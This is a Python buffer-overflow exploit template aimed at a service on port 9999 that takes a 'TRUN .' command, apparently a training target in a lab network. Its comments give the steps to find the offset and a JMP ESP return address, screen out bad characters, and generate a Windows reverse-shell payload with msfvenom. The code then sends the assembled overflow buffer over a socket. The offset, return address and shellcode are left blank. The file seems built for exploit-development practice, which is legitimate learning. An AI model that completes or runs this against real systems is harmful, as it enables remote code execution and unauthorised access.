#!/usr/bin/env python3

import re
import socket
import sys

def main():

	ip        = '10.0.2.9'  # Target IP
	port      = 9999        # Target port
	cmd       = 'TRUN .'    # Target command

	# BUFFER STRUCTURE:
	# [cmd] [padding by offset] [retip] [nop_sled] [payload]

	offset    = 0           # Length of the padding (Offset of the return IP)
	retip     = b''         # Return address (as byte string, e.g.: b'\xaf\x11\x50\62')

	nop_bytes = 0           # Length of the NOP sled

	# You can add known bad characters here
	known_badchars  = b'\x00'

	# The three different stages for payloads
	# =======================================
	# 1) Create a pattern (for example with `msf-pattern_create -l 2200`) to find the offset
	pattern_payload = ''
	#    Determine the offset with `msf-pattern_offset -l 2200 -q <string in eip>`
	#    Find a value for `retip` with `!mona jmp -r esp` (enter it in little endian byte format)

	# 2) After setting the `offset` value use the `badchar_payload` to find bad characters in the stack (repeat if necessary)
	badchar_payload = getBadChars(known_badchars)

	# 3) Finally, set the `shellcode` as payload and increase `nop_bytes`
	#    E.g.: `msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x00" -f py`
	buf = b''
	shellcode       = buf

	# Set the payload
	payload   = pattern_payload


	print(f'Targeting [{fc.cyan}{cmd}{fc.end}] at [{fc.cyan}{ip}{fc.end}:{fc.cyan}{port}{fc.end}]')

	try:
		# Encoding payload
		payload = payload.encode('latin1') if isinstance(payload, str) else payload

		# Assembling buffer
		nop_sled  = b'\x90' * nop_bytes
		padding   = 'C'*offset
		buffer    = cmd + padding
		buffer    = buffer.encode('latin1') + retip + nop_sled + payload

		# Connecting to the target
		print(f'{fc.cyan}Connecting ...{fc.end}', end='')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5) # Set a socket timeout of 5 seconds
		s.connect((ip, port))
		s.recv(1024) # Receive and discard any incoming data

		print(f'{fc.clear_line}{fc.green}Connected.{fc.end}')

		print(f'{fc.cyan}Sending {len(buffer)} bytes...{fc.end}')

		s.send(buffer)

		print(f'{fc.green}Done.{fc.end}')

	except KeyboardInterrupt:
		print(f'\n{fc.red}Aborted by user.{fc.end}')
		sys.exit(0)

	except Exception as e:
		print(f'\nError: {fc.orange}{e}{fc.end}')
		sys.exit(0)


# Create a bytestring with all bytes except those who are known to be bad characters
def getBadChars(known_badchars):
	# A list of all available bad characters ranging from 0x00 to 0xFF
	bytearray = b''.join([bytes([x]) for x in range(0,256)])
	# Automatically remove all bad characters
	bytearray = re.sub(b'[' + known_badchars + b']', b'', bytearray)
	# Return the bad character sequence without the known bad chars
	return bytearray


# Colors
class fc:
	cyan = '\033[96m'
	green = '\033[92m'
	orange = '\033[93m'
	red = '\033[91m'
	end = '\033[0m'
	bold = '\033[1m'
	clear_line = '\r\033[K'


if __name__ == '__main__':
	main()
